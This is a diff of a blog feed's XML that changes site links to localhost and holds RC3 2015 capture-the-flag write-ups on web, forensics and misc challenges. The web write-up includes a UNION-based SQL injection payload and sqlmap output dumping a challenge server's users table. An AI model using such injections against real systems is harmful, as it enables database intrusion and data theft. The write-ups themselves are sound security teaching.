-    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
+    Payload: username=test' UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
 ---
 [18:39:01] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: Apache 2.4.7, PHP 5.5.9
 back-end DBMS: MySQL 5.0
-[18:39:01] [INFO] fetching columns for table &#39;users&#39; in database &#39;TopSecret&#39;
-[18:39:01] [INFO] fetching entries for table &#39;users&#39; in database &#39;TopSecret&#39;
+[18:39:01] [INFO] fetching columns for table 'users' in database 'TopSecret'
+[18:39:01] [INFO] fetching entries for table 'users' in database 'TopSecret'
 [18:39:01] [INFO] analyzing table dump for possible password hashes
 Database: TopSecret
 Table: users
@@ -650,8 +650,8 @@ Table: users
 ...
 +----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
 
-[18:39:01] [INFO] table &#39;TopSecret.users&#39; dumped to CSV file &#39;/home/viviturtle/.sqlmap/output/162.243.171.85/dump/TopSecret/users.csv&#39;
-[18:39:01] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;
+[18:39:01] [INFO] table 'TopSecret.users' dumped to CSV file '/home/viviturtle/.sqlmap/output/162.243.171.85/dump/TopSecret/users.csv'
+[18:39:01] [INFO] fetched data logged to text files under '/home/viviturtle/.sqlmap/output/162.243.171.85'
 
 [*] shutting down at 18:39:01
 
@@ -695,11 +695,11 @@ secret=test
 
 &lt;p&gt;Now look at the web application. It thinks we are the admin.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/flag.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;The flag is &lt;strong&gt;RC3-SECRETSS-6277598130&lt;/strong&gt;. Feel free to check out &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/sqlmap_notes.txt&quot;&gt;sqlmap_notes.txt&lt;/a&gt; to see the actual sqlmap requests.&lt;/p&gt;
+&lt;p&gt;The flag is &lt;strong&gt;RC3-SECRETSS-6277598130&lt;/strong&gt;. Feel free to check out &lt;a href=&quot;http://localhost:4000/assets/rc3/TopSecret/sqlmap_notes.txt&quot;&gt;sqlmap_notes.txt&lt;/a&gt; to see the actual sqlmap requests.&lt;/p&gt;
 </description>
-        <pubDate>Sun, 29 Nov 2015 01:59:33 -0800</pubDate>
+        <pubDate>Sun, 29 Nov 2015 03:59:33 -0600</pubDate>
         <link>/blog/ctf/web/all/top-secret</link>
         <guid isPermaLink="true">/blog/ctf/web/all/top-secret</guid>
         
@@ -722,11 +722,11 @@ secret=test
     
       <item>
         <title>RC3 2015 ~ OpenW0tM8: Forensics 400</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Start.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;This wasn’t so bad for a 400 Forensics question. I spent a good few hours trying to find the flag for this, even though it should of taken only 30 minutes.&lt;/p&gt;
 
-&lt;p&gt;We are given a link to a pcap file: &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/for400.pcapng&quot;&gt;for400.pcapng&lt;/a&gt;. Whenever I do any CTF, I ALWAYS strings the file. Given that the string layout is “RC3-XXXXX-XXX”, I stringed the pcap file looking for “RC3” and flag”&lt;/p&gt;
+&lt;p&gt;We are given a link to a pcap file: &lt;a href=&quot;http://localhost:4000/assets/rc3/for400.pcapng&quot;&gt;for400.pcapng&lt;/a&gt;. Whenever I do any CTF, I ALWAYS strings the file. Given that the string layout is “RC3-XXXXX-XXX”, I stringed the pcap file looking for “RC3” and flag”&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;table&gt;
@@ -772,7 +772,7 @@ v4226 Successfully transferred &quot;/flag&quot;
 
 &lt;p&gt;Knowing this information, it was time to enter Wireshark, our great packet analysis tool and extract the data transfer. Upon opening the pcap, we can follow a few TCP streams (right click packet &amp;gt; Follow TCP Stream) to find some kind of secure webchat on some website.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png&quot; alt=&quot;Secure_chat&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Secure_chat.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Secure_chat.png&quot; alt=&quot;Secure_chat&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;GET /licence/4427091/tunnel_callback.cgi?ya3hbWK4jtBrljUv0ZPN&amp;amp;callback=_jqjsp&amp;amp;command=IWCS0116C%5ES1445994676.f232961d2e%5E4427091%5E8%5E&amp;amp;_1447612614575= HTTP/1.1
 Host: secure.livechatinc.com
@@ -794,7 +794,7 @@ Content-Encoding: gzip
 
 &lt;p&gt;Since we know that there was a file transfer for forFlag.image.tar.gz, we can assume the File Transfer Protocal (FTP) was used. Let’s look at some FTP Data. Around the 3000 packet mark, we find some FTP stuff.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Flag.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Flag.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;211 End
 PWD
@@ -816,14 +816,14 @@ CWD flag
 
 &lt;p&gt;Looking inside the stream, we see that our strings data from earlier is here. Since we know the file was transferred around the 3000 mark, let’s look for the actual packet transfer in this range of packets. After finding it (TCP_Data), we can “Follow TCP Stream” for this file transfer. (Note we cannot export objects to get FTP data)&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png&quot; alt=&quot;data_raw&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/data_raw.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/data_raw.png&quot; alt=&quot;data_raw&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;....^.DV.....\...?.g.].qu..HR5.b.MD..&quot;..Yb... h4.$.....L.=Q../;;Y./5...^.B.k.^.&amp;amp;.1..&quot;.h....!.wG.&amp;amp;.K....4.}..].$.s.^{.\?.W....y....&amp;lt;3...........mu..ba...e....[FF...s..u....5#S..9.s2.....s..[0.^.=.1w..................i.M.!.....?$._~..0_.....(....&quot;..{....Pe2f..^..q...d..U..........5F....K..jkz........*.E.NQ[.PN?~.....[.b..2.l..+..,....wW.......}.....%...U...l..e...N....x..]...8..|2k...Gf......Z..f{.X.es..ha.......7l.F{.&quot;.7-.v.m....}.$.o.o.D.Z..._...........+.........l.rQ..h..MU;.UV.j.U....b
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;A whole bunch of gibberish, so we can assume this is some kind of non-ascii file. Since we know the flag is in this data, let’s save it as raw data and see what we can do to pull the flag from here. I saved it as &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/FTP_DATA_ORIGINAL&quot;&gt;FTP_DATA&lt;/a&gt; (In this case it’s saved as FTP_DATA_ORGINAL in this repo) and started analyzing the data.&lt;/p&gt;
+&lt;p&gt;A whole bunch of gibberish, so we can assume this is some kind of non-ascii file. Since we know the flag is in this data, let’s save it as raw data and see what we can do to pull the flag from here. I saved it as &lt;a href=&quot;http://localhost:4000/assets/rc3/FTP_DATA_ORIGINAL&quot;&gt;FTP_DATA&lt;/a&gt; (In this case it’s saved as FTP_DATA_ORGINAL in this repo) and started analyzing the data.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png&quot; alt=&quot;Analysis&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Analysis.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/Analysis.png&quot; alt=&quot;Analysis&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Let’s dissect what we did here.&lt;/p&gt;
 
@@ -889,7 +889,7 @@ I renamed it to TCP_DATA.tar and extracted it again.&lt;/p&gt;
 3) binwalk
 4) Manual mount and analysis&lt;/p&gt;
 
-&lt;p&gt;Using strings and foremost we didn’t find anything except a few htm’s and images. If you guys don’t know what foremost is, it’s a tool to carve out files from another file. It pretty much looks at header and footer bytes to check for file signatures. Looking into them didn’t really give me much. All of it is saved in the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/output&quot;&gt;output&lt;/a&gt; folder.&lt;/p&gt;
+&lt;p&gt;Using strings and foremost we didn’t find anything except a few htm’s and images. If you guys don’t know what foremost is, it’s a tool to carve out files from another file. It pretty much looks at header and footer bytes to check for file signatures. Looking into them didn’t really give me much. All of it is saved in the &lt;a href=&quot;http://localhost:4000/assets/rc3/output&quot;&gt;output&lt;/a&gt; folder.&lt;/p&gt;
 
 &lt;p&gt;Last thing I did was binwalk -e (-e for extract)&lt;/p&gt;
 
@@ -897,20 +897,22 @@ I renamed it to TCP_DATA.tar and extracted it again.&lt;/p&gt;
   &lt;p&gt;binwalk -e OpenW0tM8.image&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png&quot; alt=&quot;binwalk&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/OpenW0tM8/binwalk.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/OpenW0tM8/binwalk.png&quot; alt=&quot;binwalk&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;This gave us a bunch of files. A lot of it we can ignore. Towards the end we can see a few tar files. Upon opening the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/576200.tar&quot;&gt;576200.tar&lt;/a&gt; file up, we get something very interesting. A &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/read&quot;&gt;read&lt;/a&gt; file, a &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/key&quot;&gt;key&lt;/a&gt;, &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This gave us a bunch of files. A lot of it we can ignore. Towards the end we can see a few tar files. Upon opening the &lt;a href=&quot;http://localhost:4000/assets/rc3/576200.tar&quot;&gt;576200.tar&lt;/a&gt; file up, we get something very interesting. A &lt;a href=&quot;http://localhost:4000/assets/rc3/read&quot;&gt;read&lt;/a&gt; file, a &lt;a href=&quot;http://localhost:4000/assets/rc3/key&quot;&gt;key&lt;/a&gt;, &lt;a href=&quot;http://localhost:4000/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;read&quot;&gt;read&lt;/a&gt;
-&amp;gt; openssl enc -d -in {encrypted file} -out {output file} -kfile {key} -aes-256-ecb&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;read&quot;&gt;read&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;openssl enc -d -in {encrypted file} -out {output file} -kfile {key} -aes-256-ecb&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/key&quot;&gt;key&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/key&quot;&gt;key&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;60e9 8211 8077 1fc5 69b8 29f1 3e00 d8c2
 ce9a 7523 e8b7 44bc 48a4 3815 72b6 546a
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;Salted__vg*©ÄÛ»¡¿SÏÛÏðíïIÊÌd8³
 &lt;/code&gt;&lt;/pre&gt;
@@ -924,7 +926,7 @@ RC3-WOTM-8080
 
 &lt;p&gt;And thus, the flag is &lt;strong&gt;RC3-WOTM-8080&lt;/strong&gt;. Woo.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 28 Nov 2015 02:59:33 -0800</pubDate>
+        <pubDate>Sat, 28 Nov 2015 04:59:33 -0600</pubDate>
         <link>/blog/ctf/forensics/all/OpenW0tM8</link>
         <guid isPermaLink="true">/blog/ctf/forensics/all/OpenW0tM8</guid>
         
@@ -949,14 +951,14 @@ RC3-WOTM-8080
     
       <item>
         <title>RC3 2015 ~ Super Secrets: Misc 300</title>
-        <description>&lt;p&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This was a super easy misc question. This should of been worth 150 or so points instead.&lt;/p&gt;
 
-&lt;p&gt;We given a link to a document : &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/SECRETS.doc&quot;&gt;SECRETS.doc&lt;/a&gt;. Opening it up in LibreWriter or Microsoft office showed us some text.&lt;/p&gt;
+&lt;p&gt;We given a link to a document : &lt;a href=&quot;http://localhost:4000/assets/rc3/SECRETS.doc&quot;&gt;SECRETS.doc&lt;/a&gt;. Opening it up in LibreWriter or Microsoft office showed us some text.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;TOP SECRET
-This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren&#39;t so listen up), don&#39;t view the rest of this document. That would not be cool, and we will totally retaliate against you. 
+This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren't so listen up), don't view the rest of this document. That would not be cool, and we will totally retaliate against you. 
 
 Member List
 All great overlord organizations need accountability, so here we go. The following list is a list of all of our top members. 
@@ -984,7 +986,7 @@ Smitty
 643-23-6563
 
 
-¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ ˙ʇou ʎlqɐqoɹd ɥɐu &#39;uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı &#39;ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı &#39;sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ &#39;ǝǝs noʎ ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ &#39;ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ &#39;ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı &#39;ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ &#39;uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ &#39;ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ &#39;ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ 
+¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ ˙ʇou ʎlqɐqoɹd ɥɐu 'uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı 'ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı 'sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ 'ǝǝs noʎ ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ 'ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ 'ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı 'ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ 'uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ 'ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ 'ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ 
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;As you can see there is no simple clue for the flag. There is some upside-down text, but I skipped this. For questions like this, we usually require some raw data analysis. Taking from what I know from PDF Analysis, I opened it up in a simple text editor to see what we get.&lt;/p&gt;
@@ -995,7 +997,7 @@ Smitty
 
 &amp;lt;body&amp;gt;
 &amp;lt;h1&amp;gt;TOP SECRET&amp;lt;/h1&amp;gt;
-&amp;lt;p&amp;gt;This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren&#39;t so listen up), don&#39;t view the rest of this document. That would not be cool, and we will totally retaliate against you.
+&amp;lt;p&amp;gt;This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren't so listen up), don't view the rest of this document. That would not be cool, and we will totally retaliate against you.
 &amp;lt;/p&amp;gt;
 &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
 &amp;lt;h2&amp;gt;Member List&amp;lt;/h2&amp;gt;
@@ -1040,7 +1042,7 @@ Smitty
     &amp;lt;/tr&amp;gt;
 &amp;lt;/table&amp;gt;
     &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
-¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ  ˙ʇou ʎlqɐqoɹd ɥɐu &#39;uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı &#39;ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı &#39;sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ &#39;ǝǝs noʎ  ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ &#39;ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ &#39;ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı &#39;ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ &#39;uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ &#39;ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ &#39;ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ
+¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ  ˙ʇou ʎlqɐqoɹd ɥɐu 'uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı 'ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı 'sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ 'ǝǝs noʎ  ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ 'ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ 'ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı 'ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ 'uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ 'ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ 'ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ
 
     &amp;lt;IMG SRC=&quot;http://104.131.197.49/bug.html?type=img&amp;amp;phrase=RC3-RedTeamGetRekt-1010101&quot; width=&quot;1&quot; height=&quot;1&quot;&amp;gt;
 &amp;lt;/body&amp;gt;
@@ -1052,7 +1054,7 @@ Smitty
 
 &lt;p&gt;The flag is &lt;strong&gt;RC3-RedTeamGetRekt-1010101&lt;/strong&gt;&lt;/p&gt;
 </description>
